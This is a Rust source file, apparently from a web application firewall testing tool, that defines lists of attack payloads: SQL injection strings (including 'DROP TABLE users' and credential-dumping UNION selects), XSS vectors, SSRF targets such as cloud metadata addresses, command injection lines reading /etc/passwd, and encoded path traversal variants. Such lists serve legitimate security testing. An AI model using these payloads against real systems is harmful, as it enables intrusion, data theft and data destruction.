use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WafPayload {
    pub name: String,
    pub payload: String,
    pub description: String,
    pub bypass_types: Vec<BypassType>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum BypassType {
    SqlInjection,
    Xss,
    CommandInjection,
    PathTraversal,
    Ssrf,
}

pub fn get_waf_test_payloads() -> Vec<WafPayload> {
    vec![
        WafPayload {
            name: "Basic SQLi".to_string(),
            payload: "' OR '1'='1".to_string(),
            description: "Basic SQL injection test".to_string(),
            bypass_types: vec![BypassType::SqlInjection],
        },
        WafPayload {
            name: "Union SQLi".to_string(),
            payload: "' UNION SELECT NULL--".to_string(),
            description: "UNION-based SQL injection".to_string(),
            bypass_types: vec![BypassType::SqlInjection],
        },
        WafPayload {
            name: "Basic XSS".to_string(),
            payload: "<script>alert(1)</script>".to_string(),
            description: "Basic XSS test".to_string(),
            bypass_types: vec![BypassType::Xss],
        },
        WafPayload {
            name: "SVG XSS".to_string(),
            payload: "<svg onload=alert(1)>".to_string(),
            description: "SVG-based XSS".to_string(),
            bypass_types: vec![BypassType::Xss],
        },
        WafPayload {
            name: "Path Traversal".to_string(),
            payload: "../../../etc/passwd".to_string(),
            description: "Path traversal test".to_string(),
            bypass_types: vec![BypassType::PathTraversal],
        },
        WafPayload {
            name: "SSRF Localhost".to_string(),
            payload: "http://127.0.0.1/admin".to_string(),
            description: "SSRF to localhost".to_string(),
            bypass_types: vec![BypassType::Ssrf],
        },
        WafPayload {
            name: "Command Injection".to_string(),
            payload: "; ls -la".to_string(),
            description: "Command injection test".to_string(),
            bypass_types: vec![BypassType::CommandInjection],
        },
    ]
}

pub fn get_xss_payloads() -> Vec<&'static str> {
    vec![
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<details open ontoggle=alert(1)>",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<marquee onstart=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<math><maction xlink:href=\"javascript:alert(1)\">click</maction></math>",
    ]
}

pub fn get_sqli_payloads() -> Vec<&'static str> {
    vec![
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1' AND '1'='1",
        "admin'--",
        "' OR ''='",
        "1 OR 1=1",
        "1; DROP TABLE users--",
        "' UNION SELECT username,password FROM users--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "-1' UNION SELECT 1,2,3--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND SLEEP(5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "' OR BENCHMARK(10000000,SHA1('test'))--",
    ]
}

pub fn get_ssrf_payloads() -> Vec<&'static str> {
    vec![
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://127.0.0.1.nip.io",
        "http://169.254.169.254",
        "http://metadata.google.internal",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
        "http://127.1",
        "http://127.000.000.001",
        "http://2130706433",
        "http://0x7f000001",
        "http://0177.0.0.1",
    ]
}

pub fn get_command_injection_payloads() -> Vec<&'static str> {
    vec![
        "; ls",
        "| ls",
        "&& ls",
        "|| ls",
        "$(ls)",
        "`ls`",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "; id",
        "| id",
        "$(id)",
        "`id`",
        "; whoami",
        "| whoami",
    ]
}

pub fn get_traversal_payloads() -> Vec<&'static str> {
    vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%255c..%255c..%255cwindows\\win.ini",
        "/etc/passwd%00",
        "..\\..\\..\\..\\..\\..\\etc/passwd",
        "....//....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
    ]
}
